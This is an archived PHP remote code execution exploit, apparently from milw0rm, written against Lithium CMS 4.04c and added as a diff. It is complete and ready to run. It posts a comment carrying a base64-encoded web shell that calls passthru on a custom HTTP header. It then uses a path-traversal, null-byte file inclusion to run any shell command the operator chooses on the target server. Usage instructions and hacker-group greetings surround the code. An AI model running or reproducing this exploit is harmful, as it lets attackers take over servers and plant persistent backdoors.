@@ -1,0 +1,204 @@
+<?
+
+print '
+:::::::::  :::::::::: :::     ::: ::::::::::: :::        
+:+:    :+: :+:        :+:     :+:     :+:     :+:        
++:+    +:+ +:+        +:+     +:+     +:+     +:+        
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
++#+    +#+ +#+         +#+   +#+      +#+     +#+        
+#+#    #+# #+#          #+#+#+#       #+#     #+#        
+#########  ##########     ###     ########### ########## 
+::::::::::: ::::::::::     :::     ::::    ::::  
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
+    +#+     +#+        +#+     +#+ +#+       +#+ 
+    #+#     #+#        #+#     #+# #+#       #+# 
+    ###     ########## ###     ### ###       ### 
+	
+   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+ 
+Lithium CMS <= 4.04c Remote Code Execution Exploit
+
+[Script name: Lithium 4.04c
+[Script site: https://sourceforge.net/projects/lit/
+
+Find by: Kacper (a.k.a Rahim)
+
+
+========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <========
+
+
+
+Contact: kacper1964@yahoo.pl
+
+or
+
+http://www.rahim.webd.pl/
+
+
+(c)od3d by Kacper
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Greetings DragonHeart and all DEVIL TEAM Patriots :)
+- Leito & Leon 
+TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
+Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
+mIvus, nukedclx, SkD, wacky, xoron
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+                Greetings for 4ll Fusi0n Group members ;-)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+';
+
+if ($argc<5) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path comments_id cmd OPTIONS
+host:      target server (ip/hostname)
+path:      Lithium path
+comments_id:      number of news what is in site
+cmd:       a shell command (ls -la)
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /Lithium/ 2006.10.30 ls -la -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 /  -p81
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$comments_id=$argv[3];
+$cmd="";
+
+$port=80;
+$proxy="";
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+$hauru = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuLi5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyBUbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="name"
+
+Hauru
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="www"
+
+http://www.rahim.webd.pl/
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="text"
+
+'.$hauru.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="new_comment"
+
+Add comment
+-----------------------------7d6224c08dc--
+';
+
+
+echo "creat hauru...\n";
+$packet ="POST ".$p."news/comment.php/".$comments_id." HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+sleep(1);
+
+echo "remote code execution...\n";
+$packet ="GET ".$p."classes/index.php?siteconf[curl]=../../../db/comments/news/".$comments_id."%00 HTTP/1.1\r\n";
+$packet.="HAURU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+if (strstr($html,"Hauru"))
+{
+$temp=explode("Hauru",$html);
+die($temp[1]);
+}
+echo "Exploit err0r :(";
+echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam";
+?>
+
+# milw0rm.com [2006-11-02]
